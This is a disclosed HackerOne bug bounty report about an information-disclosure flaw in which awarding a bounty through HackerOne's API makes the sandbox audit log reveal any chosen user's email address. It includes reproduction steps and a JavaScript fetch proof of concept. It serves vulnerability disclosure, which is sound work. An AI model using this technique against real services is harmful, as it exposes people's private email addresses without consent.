# View any user email using the Team's audit log section

## Report Details
- **Report ID**: 2404415
- **URL**: https://hackerone.com/reports/2404415
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2024-03-06T17:33:02.738Z
- **Disclosed**: 2024-03-26T14:00:46.469Z

## Reporter
- **Username**: kimingi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
**Summary:**
Hello team, I decided to do some further testing, and I came across another endpoint that can be used to reveal user emails. 

### Steps To Reproduce

1. Create a demo in your account https://hackerone.com/teams/new/sandbox
2. Create a token with the report manager role on https://hackerone.com/organizations/demo/settings/api_tokens
3. Copy the user ID of any user that has an account on HackerOne
4. A program bounty to that user using the API. `recipient_id` is the id of any user and `{id}` is the id of your sandbox program.
```
let inputBody = "{\n  \"data\": {\n    \"type\": \"bounty\",\n    \"attributes\": {\n      \"recipient_id\": \"2869549\",\n          \"amount\": 51,\n      \"reference\": \"newbounty1\",\n      \"title\": \"BOUNTY\",\n      \"currency\": \"USD\",\n      \"severity_rating\": \"high\"\n    }\n  }\n}";
let user = 'identifier';
let password = 'token';
let headers = new Headers();
headers.set('Authorization', 'Basic ' + btoa(user + ":" + password));
  headers.set('Content-Type', 'application/json');  headers.set('Accept', 'application/json');

fetch('https://api.hackerone.com/v1/programs/{id}/bounties',
{
  method: 'POST',
  body: inputBody,
  headers: headers
})
.then(function(res) {
    return res.json();
}).then(function(body) {
    console.log(body);
});
```
5. You will get a success message
6. After awarding the bounty to the user, head over to the audit log section of your sandbox team.
7. Notice a message is shown `"@api" awarded a $51.00 bounty to "email@email.com"`

POC
████

## Impact

View emails of other users



## Attachments
No attachments
